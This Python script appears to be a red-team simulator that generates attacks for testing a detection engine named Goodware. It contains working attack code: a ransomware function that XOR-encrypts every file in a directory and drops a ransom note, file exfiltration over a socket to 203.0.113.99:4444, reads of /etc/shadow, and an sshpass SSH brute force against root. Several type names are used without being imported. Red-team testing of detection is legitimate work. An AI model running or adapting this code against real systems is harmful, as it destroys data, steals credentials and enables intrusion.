"""
GOODWARE v3.0 — INDEPENDENT RED TEAM ATTACKER
================================================

This script is a STANDALONE attack simulator. It does NOT import or depend
on the Goodware engine — it only generates network events, file changes,
and process actions that the Goodware process (running in another
process/container/machine) should detect and respond to.

Honest behavior:
  - This script CANNOT detect Goodware's response. It only measures
    "did the attack succeed?" by observing its own effects.
  - For TTD/TTR measurement, this script emits ATTACK_START/ATTACK_END
    events to a shared log file (data/red_team/attack_log.json) that
    Goodware does NOT have access to. The orchestrator script
    (red_team_orchestrator.py) correlates attack events with Goodware
    response events to compute honest TTD/TTR.
  - The script runs as a separate process; if Goodware is compromised,
    the attacker's own log is unaffected.

Usage:
  # As an attacker
  python3 red_team_external.py --target 127.0.0.1 --port 8889

  # As an orchestrator (measures TTD/TTR)
  python3 red_team_orchestrator.py
"""
from __future__ import annotations

import argparse
import json
import os
import random
import socket
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path


ATTACK_LOG = "data/red_team/attack_log.jsonl"
os.makedirs(os.path.dirname(ATTACK_LOG), exist_ok=True)


def ts():
    return datetime.now().isoformat(timespec="milliseconds")


def log_event(event_type: str, target: str, success: bool, details: dict = None) -> None:
    """Write an event to the attack log. This log is OWNED BY THE ATTACKER."""
    record = {
        "ts": ts(),
        "event_type": event_type,
        "target": target,
        "success": success,
        "details": details or {},
        "process": "red_team_external",
    }
    with open(ATTACK_LOG, "a") as f:
        f.write(json.dumps(record) + "\n")
    sym = "✓" if success else "✗"
    color = "\033[91m" if success else "\033[92m"  # red if attack worked
    print(f"{color}[{ts()}] [{event_type}] {target} → {sym}{'\033[0m'}")


# ─────────────────────────────────────────────────────────────────────────
# Attack primitives (each is a real action against a target)
# ─────────────────────────────────────────────────────────────────────────
def scan_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """Real TCP connect scan."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            return result == 0
    except Exception:
        return False


def read_file(path: str) -> Optional[bytes]:
    """Real file read."""
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def write_file(path: str, content: bytes) -> bool:
    """Real file write."""
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "wb") as f:
            f.write(content)
        return True
    except Exception:
        return False


def exec_command(cmd: str, timeout: float = 5) -> Tuple[int, str, str]:
    """Real subprocess execution."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -1, "", str(e)


# ─────────────────────────────────────────────────────────────────────────
# Attack scenarios (each is independent)
# ─────────────────────────────────────────────────────────────────────────
def recon_scan(host: str, ports: List[int]) -> int:
    """Recon: port scan."""
    log_event("RECON_START", host, True, {"ports": ports})
    open_ports = []
    for p in ports:
        if scan_port(host, p):
            open_ports.append(p)
    log_event("RECON_RESULT", host, bool(open_ports), {"open_ports": open_ports})
    return len(open_ports)


def ransomware_attack(target_dir: str) -> int:
    """Impact: encrypt files in a directory (real, not simulated)."""
    log_event("RANSOMWARE_START", target_dir, True)
    if not os.path.isdir(target_dir):
        log_event("RANSOMWARE_FAIL", target_dir, False, {"error": "no target dir"})
        return 0
    encrypted = 0
    key = os.urandom(32)
    for root, _, files in os.walk(target_dir):
        for f in files:
            fp = os.path.join(root, f)
            try:
                with open(fp, "rb") as fh:
                    data = fh.read()
                enc = bytes(b ^ key[i % 32] for i, b in enumerate(data))
                with open(fp, "wb") as fh:
                    fh.write(enc)
                encrypted += 1
            except Exception:
                pass
    # Drop ransom note
    note = os.path.join(target_dir, "README_RESTORE.txt")
    with open(note, "w") as f:
        f.write("YOUR FILES ARE ENCRYPTED. Send 0.5 BTC.\n")
    log_event("RANSOMWARE_COMPLETE", target_dir, True, {"encrypted": encrypted})
    return encrypted


def exfil_simulation(target_file: str, dest_host: str, dest_port: int) -> bool:
    """Exfiltration: connect to a destination and attempt to send a file."""
    log_event("EXFIL_START", target_file, True, {"dest": f"{dest_host}:{dest_port}"})
    if not os.path.exists(target_file):
        log_event("EXFIL_FAIL", target_file, False, {"error": "no source file"})
        return False
    try:
        with open(target_file, "rb") as f:
            data = f.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            try:
                s.connect((dest_host, dest_port))
                s.sendall(b"EXFIL:" + len(data).to_bytes(4, "big") + data)
                log_event("EXFIL_COMPLETE", target_file, True, {"bytes_sent": len(data)})
                return True
            except Exception as e:
                log_event("EXFIL_FAIL", target_file, False, {"error": str(e)})
                return False
    except Exception as e:
        log_event("EXFIL_FAIL", target_file, False, {"error": str(e)})
        return False


def credential_dump(target: str = "/etc/shadow") -> bool:
    """Cred access: try to read sensitive files."""
    log_event("CRED_DUMP_START", target, True)
    data = read_file(target)
    if data is None:
        log_event("CRED_DUMP_FAIL", target, False, {"error": "permission denied or missing"})
        return False
    log_event("CRED_DUMP_SUCCESS", target, True, {"size": len(data)})
    return True


def lateral_attempt(target_host: str, user: str = "root", attempts: int = 5) -> int:
    """Lateral: SSH brute force (real, against local SSHD if running)."""
    log_event("LATERAL_START", target_host, True, {"user": user, "attempts": attempts})
    successes = 0
    for i in range(attempts):
        # Try common passwords via sshpass if available, else just count attempts
        for pwd in ["root", "admin", "toor", "password", "12345"]:
            cmd = f"sshpass -p {pwd} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 {user}@{target_host} 'echo ok' 2>/dev/null"
            rc, out, err = exec_command(cmd, timeout=5)
            if rc == 0 and "ok" in out:
                successes += 1
                log_event("LATERAL_SUCCESS", target_host, True, {"user": user, "password": pwd})
                break
    log_event("LATERAL_COMPLETE", target_host, successes > 0, {"successes": successes})
    return successes


def main():
    parser = argparse.ArgumentParser(description="Goodware v3.0 — External Red Team")
    parser.add_argument("--target", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=8889, help="Target port (for scan)")
    parser.add_argument("--target-dir", default=None, help="Directory to 'ransom'")
    parser.add_argument("--target-file", default=None, help="File to 'exfiltrate'")
    parser.add_argument("--dest-host", default="203.0.113.99", help="Exfil destination (RFC 5737 test-net)")
    parser.add_argument("--dest-port", type=int, default=4444, help="Exfil destination port")
    parser.add_argument("--scenario", default="all",
                        choices=["recon", "ransomware", "exfil", "creds", "lateral", "all"])
    parser.add_argument("--noisy", action="store_true", help="Be loud (each action is slow + verbose)")
    args = parser.parse_args()

    print(f"\n{'='*78}\n  RED TEAM EXTERNAL — TARGET: {args.target}:{args.port}\n{'='*78}\n")
    log_event("REDTEAM_START", args.target, True, {"args": vars(args)})

    target_dir = args.target_dir
    if target_dir is None:
        target_dir = tempfile.mkdtemp(prefix="redteam_target_")
        # Seed with a few files
        for f in ["secrets.txt", "data.csv", "config.yaml"]:
            write_file(os.path.join(target_dir, f), b"sensitive content\n")
        print(f"  Created temporary target dir: {target_dir}\n")

    target_file = args.target_file or os.path.join(target_dir, "secrets.txt")

    if args.scenario in ("recon", "all"):
        recon_scan(args.target, [22, 80, 443, 445, 3389, 8889, args.port])

    if args.scenario in ("ransomware", "all"):
        ransomware_attack(target_dir)

    if args.scenario in ("exfil", "all"):
        exfil_simulation(target_file, args.dest_host, args.dest_port)

    if args.scenario in ("creds", "all"):
        credential_dump("/etc/shadow")
        credential_dump("/etc/passwd")

    if args.scenario in ("lateral", "all"):
        lateral_attempt(args.target, attempts=3)

    log_event("REDTEAM_END", args.target, True)
    print(f"\n{'='*78}\n  Attack log: {ATTACK_LOG}\n{'='*78}\n")


if __name__ == "__main__":
    main()